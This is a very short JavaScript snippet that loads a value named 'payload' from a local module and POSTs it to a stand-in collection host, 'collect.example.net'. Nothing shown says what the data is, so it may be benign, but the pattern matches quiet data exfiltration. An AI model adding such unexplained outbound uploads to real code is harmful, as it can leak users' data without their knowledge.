const { payload } = require("./lib/static");

fetch("https://collect.example.net/v1/upload", {
  method: "POST",
  body: payload,
});
